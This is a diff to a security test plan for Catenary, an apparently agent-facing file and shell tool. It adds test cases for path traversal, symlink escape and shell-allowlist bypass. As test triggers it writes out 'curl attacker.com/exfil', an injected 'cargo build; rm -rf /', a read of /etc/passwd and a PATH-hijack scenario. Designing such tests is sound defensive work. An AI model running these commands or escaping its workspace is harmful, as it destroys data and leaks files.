@@ -385,7 +385,101 @@ Create a deeply nested directory structure approaching OS path length limits.
 
 ---
 
-## 8. LSP Server as Attack Vector
+## 8. File I/O Path Validation
+
+Catenary's file I/O tools (`read_file`, `write_file`, `edit_file`, `list_directory`) validate all paths against workspace roots. These tests verify that validation cannot be bypassed.
+
+### 8.1 Path traversal via `..`
+
+**Trigger:** `read_file` with path `workspace/../../../etc/passwd`.
+
+**Expected:** Path validation rejects the request. The resolved path is outside workspace roots.
+
+**What to verify:**
+- Path is canonicalized before validation
+- Error message does not reveal the resolved path (information leakage)
+- Symlink resolution happens before the workspace root check
+
+### 8.2 Symlink escape
+
+Create a symlink inside the workspace pointing outside:
+```
+workspace/src/escape -> /etc/
+```
+
+**Trigger:** `read_file` with path `workspace/src/escape/passwd`.
+
+**Expected:** After symlink resolution, the canonical path is outside workspace roots. Request is rejected.
+
+**What to verify:**
+- Symlinks are resolved before workspace root validation
+- The error identifies the path as outside workspace roots
+
+### 8.3 Write to Catenary config
+
+**Trigger:** `write_file` or `edit_file` targeting `.catenary.toml` or any Catenary configuration file within the workspace.
+
+**Expected:** Catenary's own configuration files are protected from modification. Request is rejected.
+
+**What to verify:**
+- Config file protection cannot be bypassed via symlinks or path traversal
+- Error message is clear about why the write was rejected
+
+### 8.4 Unicode normalization in paths
+
+**Trigger:** `read_file` with a path containing Unicode characters that normalize to `..` or path separators.
+
+**Expected:** Path validation operates on the canonical, normalized form.
+
+**What to verify:**
+- No Unicode normalization tricks bypass path validation
+
+## 9. Shell Execution Security
+
+The `run` tool enforces an allowlist of permitted commands. These tests verify the allowlist cannot be bypassed.
+
+### 9.1 Command not on allowlist
+
+**Trigger:** `run` with command `curl attacker.com/exfil`.
+
+**Expected:** Command rejected with error listing the current allowlist.
+
+**What to verify:**
+- Error message shows the allowlist (so the agent can adapt)
+- No partial execution occurs
+
+### 9.2 Injection via arguments
+
+**Trigger:** `run` with an allowed command and injected shell metacharacters in arguments: `cargo build; rm -rf /`.
+
+**Expected:** Commands are executed directly (not via shell), so metacharacters are treated as literal arguments.
+
+**What to verify:**
+- No shell interpretation of `;`, `&&`, `|`, `` ` ``, `$()`, etc.
+- The semicolon is passed as a literal argument to the command
+
+### 9.3 PATH manipulation
+
+**Trigger:** Agent attempts to create a script named `cargo` in a directory early in PATH, then calls `run` with `cargo`.
+
+**Expected:** The `run` tool resolves commands via the system PATH. This is inherent to process execution — Catenary does not control PATH.
+
+**What to verify:**
+- Document this as a known limitation (user controls PATH via their environment)
+- The allowlist checks the command name, not the full path
+
+### 9.4 Output size limits
+
+**Trigger:** `run` with a command that produces extremely large output (e.g., `cat /dev/urandom | head -c 200M` if `cat` is allowed).
+
+**Expected:** Output is capped at 100KB per stream. Command is killed after timeout (default 120s).
+
+**What to verify:**
+- Output truncation works correctly
+- Catenary remains responsive during large output
+- Memory usage is bounded
+
+## 10. LSP Server as Attack Vector
 
 The LSP server binary processes workspace files and produces responses. A compromised or malicious LSP server has full control over response content.
 
@@ -396,7 +490,7 @@ A test LSP server that returns `definition` responses pointing to `file:///etc/s
 **What to verify:**
 - URI is returned in the tool response as text (read-only display)
 - Catenary does not open or read the target file based on the URI
-- If Phase 7 `edit_file` is involved, path validation rejects it
+- `edit_file` path validation rejects it
 
 ### 8.2 LSP server returning extremely large responses
 
@@ -433,7 +527,7 @@ A test LSP server that sends extra response messages with fabricated IDs.
 
 ---
 
-## 9. Multi-Root Attack Scenarios
+## 11. Multi-Root Attack Scenarios
 
 ### 9.1 Malicious project in multi-root workspace
 
@@ -462,7 +556,7 @@ client_manager.add_root(PathBuf::from("/etc"))
 
 ---
 
-## 10. Encoding and Character Attacks
+## 12. Encoding and Character Attacks
 
 ### 10.1 Mixed encoding file
 
@@ -522,9 +616,12 @@ A mock LSP server would be valuable for sections 5 (resource exhaustion), 8 (LSP
 | Priority | Sections | Rationale |
 |----------|----------|-----------|
 | **P0** | 7.1 (symlinks), 5.1-5.3 (resource exhaustion) | Data access outside workspace, denial of service |
+| **P0** | 8.1-8.4 (file I/O path validation) | Direct filesystem access, path traversal |
+| **P0** | 9.1-9.2 (shell injection) | Command execution security |
 | **P1** | 1.1-1.3, 2.1 (prompt injection) | Core threat model for AI agent safety |
 | **P1** | 6.1-6.3 (protocol confusion) | Could break MCP transport integrity |
-| **P2** | 8.1-8.5 (malicious LSP) | Requires mock server infrastructure |
-| **P2** | 9.1-9.2 (multi-root) | Requires multi-root + adversarial content |
-| **P3** | 10.1-10.3 (encoding) | Edge cases, low likelihood of exploitation |
+| **P2** | 9.3-9.4 (shell edge cases) | Environment-dependent, bounded impact |
+| **P2** | 10.1-10.5 (malicious LSP) | Requires mock server infrastructure |
+| **P2** | 11.1-11.2 (multi-root) | Requires multi-root + adversarial content |
+| **P3** | 12.1-12.3 (encoding) | Edge cases, low likelihood of exploitation |
 | **P3** | 3.1-3.2, 4.1-4.2 (diagnostics/actions) | Lower impact, data-only exposure |
